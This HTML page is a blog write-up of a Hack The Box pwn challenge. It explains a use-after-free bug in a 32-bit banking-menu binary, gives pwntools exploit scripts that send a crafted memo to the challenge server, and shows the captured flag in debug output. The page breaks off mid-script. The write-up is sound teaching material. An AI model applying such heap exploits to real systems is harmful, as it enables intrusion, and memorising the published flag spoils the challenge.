@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="详细过程及exp1. Basic checks:1234567891011┌──(root💀kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;little_tommy]└─# file little_tommy little_tommy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-pwn-challenge[little_tommy]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/09/09/little-tommy/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="详细过程及exp1. Basic checks:1234567891011┌──(root💀kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;little_tommy]└─# file little_tommy little_tommy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy9.jpg">
+<meta property="article:published_time" content="2021-09-09T15:06:20.000Z">
+<meta property="article:modified_time" content="2021-09-10T00:57:43.133Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/09/09/little-tommy/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/09/09/little-tommy/","path":"2021/09/09/little-tommy/","title":"Hack-The-Box-pwn-challenge[little_tommy]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-pwn-challenge[little_tommy] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp"><span class="nav-number">1.</span> <span class="nav-text">详细过程及exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Basic-checks"><span class="nav-number">1.1.</span> <span class="nav-text">1. Basic checks:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-General-overview"><span class="nav-number">1.2.</span> <span class="nav-text">2. General overview:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Spot-the-vulnerability"><span class="nav-number">1.3.</span> <span class="nav-text">3. Spot the vulnerability:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Exploit-the-Use-After-Free-vulnerability-locally"><span class="nav-number">1.4.</span> <span class="nav-text">4. Exploit the Use-After-Free vulnerability locally:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Final-exploit"><span class="nav-number">1.5.</span> <span class="nav-text">5. Final exploit:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%87%AA-%E8%87%B4%E6%95%AC%E5%8E%9F%E4%BD%9C-%E2%80%A6%E2%80%A6"><span class="nav-number">2.</span> <span class="nav-text">摘自(致敬原作)……</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/09/09/little-tommy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-pwn-challenge[little_tommy] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-pwn-challenge[little_tommy]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-09-09 23:06:20" itemprop="dateCreated datePublished" datetime="2021-09-09T23:06:20+08:00">2021-09-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-09-10 08:57:43" itemprop="dateModified" datetime="2021-09-10T08:57:43+08:00">2021-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="详细过程及exp"><a href="#详细过程及exp" class="headerlink" title="详细过程及exp"></a>详细过程及exp</h2><h3 id="1-Basic-checks"><a href="#1-Basic-checks" class="headerlink" title="1. Basic checks:"></a>1. Basic checks:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/little_tommy]</span><br><span class="line">└─<span class="comment"># file little_tommy </span></span><br><span class="line">little_tommy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=861838865726f48aa954b8df920d1be3ae683b40, not stripped</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/little_tommy]</span><br><span class="line">└─<span class="comment"># checksec little_tommy</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/little_tommy/little_tommy&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="2-General-overview"><a href="#2-General-overview" class="headerlink" title="2. General overview:"></a>2. General overview:</h3><p>There are 5 options to chose from.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy.jpg"></li>
+</ul>
+<p>The first function “Create account” (1) allocates 72B of space on the heap with malloc().</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy1.jpg"></li>
+</ul>
+<p>The maximum length of (2) “First name” could be 32B as well as the maximum length of (3) “Last name”.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy2.jpg"></li>
+</ul>
+<p>The second option “Display account” prints 0–31B stored on the heap of “First name”, 32–64B of “Last name” and 65 — 72B of “Account balance”.</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy3.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy4.jpg"></p>
+</li>
+</ul>
+<p>The third function deletes the account by calling free() on the space pointed by *main_account.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy5.jpg"></li>
+</ul>
+<p>The fourth option “Add memo” copies user input to the heap.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy6.jpg"></li>
+</ul>
+<p>Last option prints the flag if there is an account created and 64 — 72 bytes of the space of the account variable (which are stored on the heap) are set to 0x6b637566 which means in ASCII “fuck”.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy7.jpg"></li>
+</ul>
+<h3 id="3-Spot-the-vulnerability"><a href="#3-Spot-the-vulnerability" class="headerlink" title="3. Spot the vulnerability:"></a>3. Spot the vulnerability:</h3><p>There is a <span class="exturl" data-url="aHR0cHM6Ly9lbmN5Y2xvcGVkaWEua2FzcGVyc2t5LmNvbS9nbG9zc2FyeS91c2UtYWZ0ZXItZnJlZS8=">Use-After-Free<i class="fa fa-external-link-alt"></i></span> — vulnerability related to incorrect use of dynamic memory during program operation.</p>
+<p>If you first create an account the pointer used for dynamic memory allocation will point at the end of the chunk (1).</p>
+<p>If you delete it, then the pointer, instead of being set to null continues to refer to the now-freed memory, the result is a dangling pointer (2).</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy8.jpg"></li>
+</ul>
+<p>If the program then allocates this same chunk of memory to *memo (3) the dangling pointer will now reference this new data set.</p>
+<p>So at the end *main_account + 0x40 will be overflowed by 64–72B added by “Add memo” functionality (4).</p>
+<h3 id="4-Exploit-the-Use-After-Free-vulnerability-locally"><a href="#4-Exploit-the-Use-After-Free-vulnerability-locally" class="headerlink" title="4. Exploit the Use-After-Free vulnerability locally:"></a>4. Exploit the Use-After-Free vulnerability locally:</h3><p>First — create an account with random data (could be blank).</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Please enter an operation number: 1</span><br><span class="line"></span><br><span class="line">First name: aaaa</span><br><span class="line">Last name: aaaa</span><br><span class="line"></span><br><span class="line">Thank you, your account number 155584960.</span><br></pre></td></tr></table></figure>
+
+<p>Then delete this account - to set the dangling pointer at the beginning.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please enter an operation number: 3</span><br><span class="line"></span><br><span class="line">Account deleted successfully</span><br></pre></td></tr></table></figure>
+
+<p>Add memo - to overwrite the dynamic memory space referenced by *main_account with custom bytes, thus overwriting 0x40B with “fuck”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Please enter an operation number: 4</span><br><span class="line"></span><br><span class="line">Please enter memo:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafuck</span><br><span class="line"></span><br><span class="line">Thank you, please keep this reference number number safe: 155584960.</span><br></pre></td></tr></table></figure>
+
+<p>Use the 5th option to read the flag since both conditions are True.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter an operation number: 5</span><br><span class="line">/bin/cat: flag: 没有那个文件或目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-Final-exploit"><a href="#5-Final-exploit" class="headerlink" title="5. Final exploit:"></a>5. Final exploit:</h3><ul>
+<li>getflag.py</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;188.166.173.208&#x27;</span>, <span class="number">30638</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;memo:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;memo:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span> * <span class="number">16</span> + <span class="string">&#x27;fuck&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Please enter an operation number:</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    <span class="string">&#x27;5\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x3 bytes:</span><br><span class="line">    <span class="string">&#x27;5\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x9e bytes:</span><br><span class="line">    <span class="string">&#x27;HTB&#123;I_am_so_heaped_up_right_now&#125;\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create account\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Display account\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Delete account\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Add memo\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Print flag\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Please enter an operation number: &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>getflag1.py</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;188.166.173.208&quot;</span>, <span class="number">30638</span>)</span><br><span class="line"></span><br><span class="line">p.recvline(<span class="string">&quot;Please enter an operation number:&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;First name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;luci&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Last name:&quot;</span>)</span><br><span class="line">p.sendline(<span 